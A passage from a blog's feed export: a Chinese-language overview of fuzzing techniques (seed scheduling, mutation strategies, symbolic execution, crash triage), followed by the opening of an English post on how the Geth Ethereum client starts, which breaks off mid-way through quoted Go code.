style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>执行的时间成本更低，但是测试了相同的代码集，有相同的覆盖度。</p><p>Fuzzers 在实践中使用了各种不同的覆盖度指标。例如，<em>AFL 的</em> minset 是基于分支覆盖度的，每个分支上有一个对数计数器。这背后的理念是只有当它们的数量级不同时，才认为分支计数是不同的。<em>Honggfuzz</em> 基于执行的指令数、执行的分支数和 unique 的基本块 (basic block, 可以简单认为连续顺序执行的一段指令) 来计算覆盖度。这个指标允许 fuzzer 将较为费时的种子配置添加到 minset 中，这有助于发现拒绝服务漏洞或性能问题。</p><p>此外，种子修剪减少种子池的大小。例如，AFL 使用代码覆盖度插桩来迭代地移除部分种子，只要修改后的种子能达到相同的覆盖度。通过这些技术，fuzzers 能够更有效地执行测试，提高漏洞发现的几率，同时减少不必要的计算和资源消耗。</p><h1>SCHEDULING</h1><p>回顾之前的通用算法，调度的过程涉及选择下一个 fuzz 迭代的 fuzz 配置，通过分析当前可用信息来实现最优结果，例如最大化覆盖率。在更先进的 fuzzers 中，如 BFF 和 AFLFast，它们的成功在很大程度上归功于它们创新的调度算法。</p><img src="http://cdn.blog-blockchain.xyz/202310171416565.png" alt="image-20231017141649444" style="zoom: 50%;" /><p>在黑盒设置中，**FCS（Fuzz Configuration Scheduling）**算法能够使用的唯一信息是关于一个配置的 fuzz 结果——目前使用该配置发现的崩溃和漏洞数量，以及到目前为止在该配置上花费的时间。</p><p>在灰盒设置中，FCS 算法可以访问关于每个 fuzz 配置的更丰富信息集，例如，在 fuzz 一个配置时所达到的代码覆盖率。AFL 是这一类别的先驱，它基于进化算法（EA）。直观地说，EA 维护一个 fuzz 配置的种群，每个配置都有一定的“适应度”值。EA 选择适合的配置，并对其应用基因转换，如突变和重组，产生后代，这些后代可能在未来成为新的 fuzz 配置。这种方法的假设是，这些生成的配置更有可能适应目标环境。</p><p>如果你对灰盒调度算法的细节感兴趣，可以关注 AFL 到 AFLFast，再到 AFLGo 的发展，这一系列的进化展示了调度算法的进步。此外，还有一些后续的 fuzzers 利用静态分析来进一步提高效率和效果。这些工具和方法的发展不断推动着软件测试和安全研究的前沿，使 fuzzing 成为一个日益重要和有效的工具。</p><h1>INPUT GENERATION</h1><p>在 fuzzer 的设计中，用于<code>input generation</code>的技术是其中最关键的部分。基本上，fuzzers 可以分为两种类型：生成型和变异型。</p><ul><li><strong>生成型 fuzzer</strong>根据描述待测试程序（PUT）期望输入的模型来生成测试用例。这类 fuzzers 可以由用户通过预定义模型进行配置，提供 API 以创建自定义输入模型，或接收用户提供的协议规范和基于语法的输入。</li><li><strong>变异型 fuzzer</strong>通常被认为没有明确的模型，因为种子仅是示例输入，并没有完全描述 PUT 的预期输入范围。</li></ul><h2 id="Generation-Based-Fuzzers">Generation-Based Fuzzers</h2><ul><li><strong>预定义模型</strong>：用户可以配置预定义的模型。这类 fuzzer 允许用户创建自己的输入模型或接收用户提供的协议规范、基于语法的输入。</li><li><strong>推导模型</strong>：不依赖于预定义或用户提供的模型，而是推导出模型。这种推导可能在<code>PREPROCESS</code>阶段进行，包括通过数据驱动方法推导控制流图，或通过分析 API 记录来推导输入。例如，PULSAR 可以根据一套捕获的网络数据包自动推导出网络协议模型，然后使用学到的网络协议对程序进行 fuzz。</li></ul><h2 id="Mutation-Based-Fuzzers">Mutation-Based Fuzzers</h2><p>变异型 fuzzers 是一种在软件测试中广泛使用的工具，它们通过修改现有的输入数据（种子）来生成新的测试用例。这种方法特别适合于测试复杂软件系统，但是生成特定路径条件的测试用例的难度较大。</p><p>经典的随机生成测试用例的方法，在需要满足特定路径的条件时，效率不高。考虑一个简单的 C 语句：<code>if (input == 42)</code>。如果输入是 32 位整数，随机猜测正确的输入值的概率是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mi mathvariant="normal">/</mi><msup><mn>2</mn><mn>32</mn></msup></mrow><annotation encoding="application/x-tex">1/2^{32}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord">1/</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span></span></span></span></span></span></span></span>。变异型 fuzzers 正是在这样的背景下产生的，其目标是从现有种子中筛选出最有可能触发新路径或行为的种子。</p><p><strong>Bit-flipping</strong>是许多 fuzzer 常用的一种技巧。为了随机地变异种子，一些 fuzzer 采用一个称为 mutation ratio 的用户参数，这决定了在<code>INPUTGEN</code>的单次执行中要翻转（0 与 1 互相替换）的位的数量。</p><p><strong>Arithmetic Mutation</strong>这种方法将种子中的特定部分视为整数，并对其执行简单的算术操作。例如，AFL 可能会随机选择种子中的一个 4 字节值，并用一个随机生成的小整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>替换它。</p><p>还有几种<strong>block-based mutation</strong>策略，其中 block 是种子的连续字节：</p><ul><li>在种子的随机位置插入随机生成的块。</li><li>从种子中删除随机选择的块。</li><li>用随机值替换随机选择的块。</li><li>调整种子的大小，例如通过添加随机块。</li><li>从一个种子中取一个随机块插入到另一个种子的随机位置。</li></ul><p><strong>预定义值替换</strong>：在某些情况下，使用预定义的值（如格式字符<code>%s</code>和<code>%x</code>）替换输入中的某些部分，特别是在针对格式字符串漏洞的测试中。</p><h2 id="White-box-Fuzzer-的程序分析">White-box Fuzzer 的程序分析</h2><p>对于白盒 fuzzers，它们通过执行复杂的静态或动态分析来进行深入的变异，从而能够更准确地识别潜在的漏洞和错误。例如，Dowser 这样的工具在编译阶段执行静态分析，利用启发式方法寻找可能包含错误的代码区域，特别是循环结构。</p><h3 id="Dynamic-Symbolic-Execution">Dynamic Symbolic Execution</h3><p>从高层次来看，动态符号执行使用符号值作为输入来运行程序，而不是具体的值。当执行待测试程序（PUT）时，它会构建符号表达式。每当遇到条件分支指令时，动态符号执行会分叉两个符号执行环境：一个代表真分支，另一个代表假分支。对于每个路径，动态符号执行会构建一个路径公式，如果存在满足该路径的具体输入，则该路径公式是可满足的。人们可以通过查询 SMT（Satisfiability Modulo Theories）求解器获得路径公式的解，从而生成具体的输入。</p><p>然而，与灰盒或黑盒方法相比，动态符号执行的速度相对较慢。为了解决这个问题，一个常见的策略是结合灰盒 fuzzing 来估计执行每个路径的概率，或者是用户指定 PUT 的某些部分来专门进行动态符号执行。</p><h3 id="Guided-Fuzzing">Guided Fuzzing</h3><p>导向 fuzzing 主要分为两个阶段：</p><ol><li>对 PUT 进行深入的程序分析以获取有用信息。</li><li>根据前面的分析生成测试用例。</li></ol><p>例如，TaintScope 使用精细的污点分析来找出“热点字节”，即那些流入关键系统或 API 调用的输入字节。Angora 则改进了这种“热点字节”的方法，使用污点分析将每个路径约束与相应的字节相关联。接着，Angora 采用梯度下降算法的启发式搜索来引导其变异，以解决这些约束。</p><p>通过这些高级的分析和变异技术，白盒 fuzzers 能够更有效地探测到程序中的复杂错误和漏洞，使得 fuzzing 测试更为深入和全面。这些方法的应用不仅提高了 fuzzing 的效果，也为软件测试和安全分析提供了更多的可能性。</p><h1>INPUT EVALUATION</h1><p>在生成输入之后，fuzzer 会在此输入上执行 PUT 并决定如何处理执行结果。此过程称为<code>input evaluation</code>。</p><p>关键目的是使用 bug oracle 检测 bug，它是一种安全策略。例如，由于指针覆盖导致的内存漏洞在被解引用时可能会抛出段错误。此外，研究者提出了多种方法来高效地检测不安全或不期望的程序行为。</p><ul><li><strong>Memory and Type Safety</strong>：追踪有效内存地址和不兼容的类型转换；检测非法的控制流修改。</li><li><strong>Input Validation</strong>：例如 XSS 和 SQL 注入漏洞。</li><li><strong>Semantic Difference</strong>：语义错误通常通过<strong>differential testing</strong>方法发现，该方法比较相似（但不完全相同）的程序的行为，比如对同一协议的不同实现的库，进行测试。</li></ul><p>fuzzer 在评估阶段应该对程序 bug 的结果进行分类和分析。分析和报告违反策略的测试用例的过程称为<strong>triage</strong>。</p><p>首先，<strong>deduplication</strong>是一种修剪输出集的过程，其中删除了那些触发与其他测试用例相同错误的输出。它避免了在硬盘上存储重复的结果，也更加概括性地呈现运行结果。</p><p>目前在实践中使用的三种主要去重方法是：stack backtrace hashing、coverage-based deduplication 和<strong>Semantics-aware Deduplication</strong>。</p><ul><li><p><strong>Stack backtrace hashing</strong>：在此方法中，一个自动化工具会在崩溃时记录 stack backtrace，并基于该 backtrace 的内容分配一个 stack hash。例如，如果程序在执行 function <code>foo</code> 的某行代码时崩溃，并且调用堆栈为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">a</mi><mi mathvariant="normal">i</mi><mi mathvariant="normal">n</mi></mrow><mo>→</mo><mi mathvariant="normal">d</mi><mo>→</mo><mi mathvariant="normal">c</mi><mo>→</mo><mi mathvariant="normal">b</mi><mo>→</mo><mi mathvariant="normal">a</mi><mo>→</mo><mrow><mi mathvariant="normal">f</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">o</mi></mrow></mrow><annotation encoding="application/x-tex">\mathrm{main}\rightarrow \mathrm{d}\rightarrow \mathrm{c}\rightarrow \mathrm{b}\rightarrow \mathrm{a}\rightarrow \mathrm{foo}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6679em;"></span><span class="mord"><span class="mord mathrm">main</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathrm">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathrm">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathrm">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathrm">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord mathrm">foo</span></span></span></span></span>，那么对于特定栈长度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">n=5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span>的 stack backtrace hashing 的类别，其他调用堆栈如果以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">a</mi><mi mathvariant="normal">i</mi><mi mathvariant="normal">n</mi></mrow><mo>→</mo><mi mathvariant="normal">d</mi><mo>→</mo><mi mathvariant="normal">c</mi><mo>→</mo><mi mathvariant="normal">b</mi><mo>→</mo><mi mathvariant="normal">a</mi><mo>→</mo><mrow><mi mathvariant="normal">f</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">o</mi></mrow></mrow><annotation encoding="application/x-tex">\mathrm{main}\rightarrow \mathrm{d}\rightarrow \mathrm{c}\rightarrow \mathrm{b}\rightarrow \mathrm{a}\rightarrow \mathrm{foo}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6679em;"></span><span class="mord"><span class="mord mathrm">main</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathrm">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathrm">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathrm">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathrm">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord mathrm">foo</span></span></span></span></span>崩溃，那么就算做一类。</p><img src="http://cdn.blog-blockchain.xyz/202310211427326.png" alt="image-20231021142715192" style="zoom:50%;" /></li><li><p><strong>Coverage-based Deduplication</strong>：AFL 根据是否覆盖了新的程序路径来确定崩溃是否独特。</p></li><li><p><strong>Semantics-aware Deduplication</strong>：例如，RETracer 通过反向数据流分析来分类崩溃，通过分析崩溃转储来确定哪个指针引起了崩溃，并递归地跟踪哪个指令赋予了错误的值。</p></li></ul><p><strong>Prioritization</strong>，也称为 fuzzer 中的<strong>taming problem</strong>，是根据测试用例触发的漏洞的严重性和独特性对其进行排序或分类的过程。而<strong>exploitability</strong>则用于非正式地评估开发出实际攻击工具的可能性。</p><p><strong>triage</strong>的另一个重要部分是<strong>test case minimization</strong>。它生成一个比原来更小、更简单但仍然导致违规的测试用例。这一步骤对于精确定位漏洞和简化复杂的测试用例至关重要。</p><p><code>input evaluation</code>阶段在 fuzzing 过程中扮演着关键角色，不仅涉及 bug 的检测和分类，还包括对测试用例进行有效的优化和简化，以提高后续分析的效率和精确性。</p><h1>CONFIGURATION UPDATING</h1><p>黑盒 fuzzer 的<code>CONFUPDATE</code>函数的行为，与灰盒或白盒 fuzzer 非常不同。这个函数允许 fuzzer 根据在当前 fuzzing 运行中收集到的配置和执行信息来修改配置集合。这种动态调整配置的能力是灰盒和白盒 fuzzing 策略的核心部分，使得 fuzzing 过程可以根据实时反馈进行自适应调整。</p><p>在基于进化算法（EA）的 fuzzers 中，<code>CONFUPDATE</code>函数特别重要。这些 fuzzers 在新个体被发现的过程中维护一个所谓的“有前景的”种子池，使种子池随着 fuzz 活动的进行而不断进化。大多数基于 EA 的 fuzzers 使用节点或分支覆盖作为适应性函数，来衡量种子的有效性。</p><p>因此，一个重要的研究领域是精化适应性函数，使其能够检测到更微妙和更细粒度的改进指标。例如，AFL 优化其适应性函数定义，通过记录分支被执行的次数来评估每个种子的有效性。这种方法允许 fuzzer 优先考虑那些可能探索到程序新路径的种子，从而更有效地覆盖更广泛的代码区域。</p><p>此外，一些 fuzzers 还会使用其他指标，如代码路径的独特性、执行时间、内存使用等，来进一步细化种子的选择和变异策略。通过不断调整和优化这些参数，<code>CONFUPDATE</code>函数使 fuzzer 能够更智能地响应测试过程中的发现，从而提高整体 fuzzing 过程的效率和有效性。</p><h1>Reference</h1><ol><li>Manès, V. J., Han, H., Han, C., Cha, S. K., Egele, M., Schwartz, E. J., &amp; Woo, M. (2019). The art, science, and engineering of fuzzing: A survey. <em>IEEE Transactions on Software Engineering</em>, <em>47</em>(11), 2312-2331.</li><li>H. Gascon, C. Wressnegger, F. Yamaguchi, D. Arp, and K. Rieck, “PULSAR: Stateful black-box fuzzing of proprietary network protocols,” in Proc. Int. Conf. Security Privacy Commun. Syst.,2015, pp. 330–347.</li><li>I. Haller, A. Slowinska, M. Neugschwandtner, and H. Bos, “Dowsing for overflows: A guided fuzzer to find buffer boundary violations,” in Proc. USENIX Security Symp.,2013, pp. 49–64</li><li>T. Wang, T. Wei, G. Gu, and W. Zou, “TaintScope: A checksumaware directed fuzzing tool for automatic software vulnerability detection,” in Proc. IEEE Symp. Security Privacy, 2010, pp. 497–512.</li><li>P. Chen and H. Chen, “Angora: Efficient fuzzing by principled search,” in Proc. IEEE Symp. Security Privacy, 2018, pp. 855–869.</li><li>W. Cui, M. Peinado, S. K. Cha, Y. Fratantonio, and V. P. Kemerlis, “RETracer: Triaging crashes by reverse execution from partial memory dumps,” in Proc. Int. Conf. Softw. Eng., 2016, pp. 820–831.</li></ol>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/pl/understanding-program-analysis/&quot; title=&quot;（一）初识软件分析&quot;&gt;（一）初识软件分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/data-flow-analysis/&quot; title=&quot;（二）数据流分析基础&quot;&gt;（二）数据流分析基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/LP-souffle/&quot; title=&quot;（三）Datalog和程序分析&quot;&gt;（三）Datalog和程序分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/ssa-and-sparse-analysis/&quot; title=&quot;（四）静态单赋值和稀疏分析&quot;&gt;（四）静态单赋值和稀疏分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/Interprocedural-DFA/&quot; title=&quot;（五）过程间分析&quot;&gt;（五）过程间分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/points-to-analysis/&quot; title=&quot;（六）指向分析&quot;&gt;（六）指向分析&lt;</summary>
        
      
    
    
    
    <category term="program language" scheme="https://www.blog-blockchain.xyz/categories/program-language/"/>
    
    
    <category term="program language" scheme="https://www.blog-blockchain.xyz/tags/program-language/"/>
    
  </entry>
  
  <entry>
    <title>How Geth starts its server</title>
    <link href="https://www.blog-blockchain.xyz/geth/Geth-Unveiled-Ethereum-Startup/"/>
    <id>https://www.blog-blockchain.xyz/geth/Geth-Unveiled-Ethereum-Startup/</id>
    <published>2023-09-13T15:02:10.000Z</published>
    <updated>2024-11-15T14:30:54.923Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/geth/tx-signature/" title="交易的签名">交易的签名</a></li><li><a href="/geth/understand-receipt/" title="理解收据receipt">理解收据receipt</a></li><li><a href="/geth/blocks/" title="理解区块">理解区块</a></li><li><a href="/geth/understand-tx/" title="理解交易">理解交易</a></li><li><a href="/geth/blockchain-core/" title="blockchain核心">blockchain核心</a></li><li><a href="/geth/forkId/" title="forkId 解读">forkId 解读</a></li><li><a href="/geth/bloom-filter/" title="布隆过滤器原理">布隆过滤器原理</a></li><li><a href="/geth/tx-pool/" title="交易池分析">交易池分析</a></li><li><a href="/geth/oracle-introduction/" title="oracle 原理和实现">oracle 原理和实现</a></li><li><a href="/geth/txlist/" title="TxList 解读">TxList 解读</a></li><li><a href="/geth/MPT-Tree/" title="MPT树">MPT树</a></li><li><a href="/geth/block-sync/" title="区块同步">区块同步</a></li><li><a href="/geth/introduction/" title="geth源码学习——介绍">geth源码学习——介绍</a></li><li><a href="/geth/Geth-Unveiled-Ethereum-Startup/" title="How Geth starts its server">How Geth starts its server</a></li></ol></blockquote><p>When starting up, the Geth client begins by parsing the command line parameters. This process kicks off with the <code>geth</code> function: <code>func geth(ctx *cli.Context) error </code> at <code>cmd/geth/main.go:326</code> where the <code>geth</code> prepares the metric if enabled. Subsequently, the <code>makeFullNode</code> function takes over. It reads the provided configuration file or command line flags. As a result, it returns two key components: <strong>the protocol stack</strong> and <strong>the backend API</strong>.</p><p>It’s worth noting the importance of the Backend API. It establishes a myriad of interfaces, facilitating interaction with nodes and handling external RPC call limits.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Backend interface provides the common API services (that are provided by</span></span><br><span class="line"><span class="comment">// both full and light clients) with access to necessary functions.</span></span><br><span class="line"><span class="keyword">type</span> Backend <span class="keyword">interface</span> &#123;</span><br><span class="line"><span class="comment">// General Ethereum API</span></span><br><span class="line">SyncProgress() ethereum.SyncProgress</span><br><span class="line"></span><br><span class="line">SuggestGasTipCap(ctx context.Context) (*big.Int, <span class="type">error</span>)</span><br><span class="line">FeeHistory(ctx context.Context, blockCount <span class="type">uint64</span>, lastBlock rpc.BlockNumber, rewardPercentiles []<span class="type">float64</span>) (*big.Int, [][]*big.Int, []*big.Int, []<span class="type">float64</span>, <span class="type">error</span>)</span><br><span class="line">ChainDb() ethdb.Database</span><br><span class="line">AccountManager() *accounts.Manager</span><br><span class="line">ExtRPCEnabled() <span class="type">bool</span></span><br><span class="line">RPCGasCap() <span class="type">uint64</span>            <span class="comment">// global gas cap for eth_call over rpc: DoS protection</span></span><br><span class="line">RPCEVMTimeout() time.Duration <span class="comment">// global timeout for eth_call over rpc: DoS protection</span></span><br><span class="line">RPCTxFeeCap() <span class="type">float64</span>         <span class="comment">// global tx fee cap for all transaction related APIs</span></span><br><span class="line">UnprotectedAllowed() <span class="type">bool</span>     <span class="comment">// allows only for EIP155 transactions.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Blockchain API</span></span><br><span class="line">SetHead(number <span class="type">uint64</span>)</span><br><span class="line">HeaderByNumber(ctx context.Context, number rpc.BlockNumber) (*types.Header, <span class="type">error</span>)</span><br><span class="line">HeaderByHash(ctx context.Context, hash common.Hash) (*types.Header, <span class="type">error</span>)</span><br><span class="line">HeaderByNumberOrHash(ctx context.Context, blockNrOrHash rpc.BlockNumberOrHash) (*types.Header, <span class="type">error</span>)</span><br><span class="line">CurrentHeader() *types.Header</span><br><span class="line">CurrentBlock() *types.Header</span><br><span class="line">BlockByNumber(ctx context.Context, number rpc.BlockNumber) (*types.Block, <span class="type">error</span>)</span><br><span class="line">BlockByHash(ctx context.Context, hash common.Hash) (*types.Block, <span class="type">error</span>)</span><br><span class="line">BlockByNumberOrHash(ctx context.Context, blockNrOrHash rpc.BlockNumberOrHash) (*types.Block, <span class="type">error</span>)</span><br><span class="line">StateAndHeaderByNumber(ctx context.Context, number rpc.BlockNumber) (*state.StateDB, *types.Header, <span class="type">error</span>)</span><br><span class="line">StateAndHeaderByNumberOrHash(ctx context.Context, blockNrOrHash rpc.BlockNumberOrHash) (*state.StateDB, *types.Header, <span class="type">error</span>)</span><br><span class="line">PendingBlockAndReceipts() (*types.Block, types.Receipts)</span><br><span class="line">GetReceipts(ctx context.Context, hash common.Hash) (types.Receipts, <span class="type">error</span>)</span><br><span class="line">GetTd(ctx context.Context, hash common.Hash) *big.Int</span><br><span class="line">GetEVM(ctx context.Context, msg *core.Message, state *state.StateDB, header *types.Header, vmConfig *vm.Config, blockCtx *vm.BlockContext) (*vm.EVM, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">error</span>)</span><br><span class="line">SubscribeChainEvent(ch <span class="keyword">chan</span>&lt;- core.ChainEvent) event.Subscription</span><br><span class="line">SubscribeChainHeadEvent(ch <span class="keyword">chan</span>&lt;- core.ChainHeadEvent) event.Subscription</span><br><span class="line">SubscribeChainSideEvent(ch <span class="keyword">chan</span>&lt;- core.ChainSideEvent) event.Subscription</span><br><span class="line"></span><br><span class="line"><span class="comment">// Transaction pool API</span></span><br><span class="line">SendTx(ctx context.Context, signedTx *types.Transaction) <span class="type">error</span></span><br><span class="line">GetTransaction(ctx context.Context, txHash common.Hash) (*types.Transaction, common.Hash, <span class="type">uint64</span>, <span class="type">uint64</span>, <span class="type">error</span>)</span><br><span class="line">GetPoolTransactions() (types.Transactions, <span class="type">error</span>)</span><br><span class="line">GetPoolTransaction(txHash common.Hash) *types.Transaction</span><br><span class="line">GetPoolNonce(ctx context.Context, addr common.Address) (<span class="type">uint64</span>, <span class="type">error</span>)</span><br><span class="line">Stats() (pending <span class="type">int</span>, queued <span class="type">int</span>)</span><br><span class="line">TxPoolContent() (<span class="keyword">map</span>[common.Address][]*types.Transaction, <span class="keyword">map</span>[common.Address][]*types.Transaction)</span><br><span class="line">TxPoolContentFrom(addr common.Address) ([]*types.Transaction, []*types.Transaction)</span><br><span class="line">SubscribeNewTxsEvent(<span class="keyword">chan</span>&lt;- core.NewTxsEvent) event.Subscription</span><br><span class="line"></span><br><span class="line">ChainConfig() *params.ChainConfig</span><br><span class="line">Engine() consensus.Engine</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is copied from filters.Backend</span></span><br><span class="line"><span class="comment">// eth/filters needs to be initialized from this backend type, so methods needed by</span></span><br><span class="line"><span class="comment">// it must also be included here.</span></span><br><span class="line">GetBody(ctx context.Context, hash common.Hash, number rpc.BlockNumber) (*types.Body, <span class="type">error</span>)</span><br><span class="line">GetLogs(ctx context.Context, blockHash common.Hash, number <span class="type">uint64</span>) ([][]*types.Log, <span class="type">error</span>)</span><br><span class="line">SubscribeRemovedLogsEvent(ch <span class="keyword">chan</span>&lt;- core.RemovedLogsEvent) event.Subscription</span><br><span class="line">SubscribeLogsEvent(ch <span class="keyword">chan</span>&lt;- []*types.Log) event.Subscription</span><br><span class="line">SubscribePendingLogsEvent(ch <span class="keyword">chan</span>&lt;- []*types.Log) event.Subscription</span><br><span class="line">BloomStatus() (<span class="type">uint64</span>, <span class="type">uint64</span>)</span><br><span class="line">ServiceFilter(ctx context.Context, session *bloombits.MatcherSession)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>For instance, the <code>SyncProgress()</code> method captures the node’s status as it synchronizes with the Ethereum network.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> SyncProgress <span class="keyword">struct</span> &#123;</span><br><span class="line">StartingBlock <span class="type">uint64</span> <span class="comment">// Block number where sync began</span></span><br><span class="line">CurrentBlock  <span class="type">uint64</span> <span class="comment">// Current block number where sync is at</span></span><br><span class="line">HighestBlock  <span class="type">uint64</span> <span class="comment">// Highest alleged block number in the chain</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &quot;fast sync&quot; fields. These used to be sent by geth, but are no longer used</span></span><br><span class="line"><span class="comment">// since version v1.10.</span></span><br><span class="line">PulledStates <span class="type">uint64</span> <span class="comment">// Number of state trie entries already downloaded</span></span><br><span class="line">KnownStates  <span class="type">uint64</span> <span class="comment">// Total number of state trie entries known about</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &quot;snap sync&quot; fields.</span></span><br><span class="line">SyncedAccounts      <span class="type">uint64</span> <span class="comment">// Number of accounts downloaded</span></span><br><span class="line">SyncedAccountBytes  <span class="type">uint64</span> <span class="comment">// Number of account trie bytes persisted to disk</span></span><br><span class="line">SyncedBytecodes     <span class="type">uint64</span> <span class="comment">// Number of bytecodes downloaded</span></span><br><span class="line">SyncedBytecodeBytes <span class="type">uint64</span> <span class="comment">// Number of bytecode bytes downloaded</span></span><br><span class="line">SyncedStorage       <span class="type">uint64</span> <span class="comment">// Number of storage slots downloaded</span></span><br><span class="line">SyncedStorageBytes  <span class="type">uint64</span> <span class="comment">// Number of storage trie bytes persisted to disk</span></span><br><span class="line"></span><br><span class="line">HealedTrienodes     <span class="type">uint64</span> <span class="comment">// Number of state trie nodes 